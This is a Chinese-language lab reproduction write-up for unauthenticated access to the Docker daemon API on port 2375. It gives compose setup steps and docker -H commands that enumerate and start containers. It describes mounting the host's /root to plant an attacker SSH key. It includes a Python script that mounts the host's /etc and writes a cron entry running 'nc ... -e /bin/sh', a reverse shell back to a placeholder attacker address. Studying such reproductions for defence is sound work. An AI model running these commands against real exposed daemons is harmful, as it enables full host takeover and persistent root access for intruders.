# docker daemon api 未授权访问漏洞

## 漏洞环境

编译及启动漏洞环境：

```plain
docker compose build
docker compose up -d
```

环境启动后，将监听2375端口。

## 漏洞复现

### 执行命令

列出所有镜像：

```plain
docker -H tcp://your-ip:2375 images
```

列出所有容器：

```plain
docker -H tcp://your-ip:2375 ps -a
```

启动一个已经停止的容器：

```plain
docker -H tcp://your-ip:2375 start <container ID>
```

连接一个已经停止的容器：

```plain
docker -H tcp://your-ip:2375 attach <container ID>
```

### 获取权限

#### 写入 ssh 公钥

启动一个容器，挂载宿主机的 /root目录，之后将攻击者的 ssh 公钥 ~/.ssh/id_rsa.pub的内容写到入宿主机的 /root/.ssh/authorized_keys文件中，之后就可以用 root 账户直接登录了。

本地获取 ssh 公钥：

```plain
ssh-keygen -t rsa
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780842197307-448ba9ff-ea62-4566-a927-87c6939f2be5.png)

#### 反弹 shell

随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。可以将命令写入crontab配置文件，进行反弹shell。

```plain
import docker

client = docker.DockerClient(base_url='http://[docker ip]:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc [your ip] 2333 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

监听2333端口，接收反弹shell。

此处的反弹shell需要和/etc/crontabs/root文件同时写入，不能后续追加。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780842197379-c237d5d2-e2e5-45bf-993c-1a99a71fb121.png)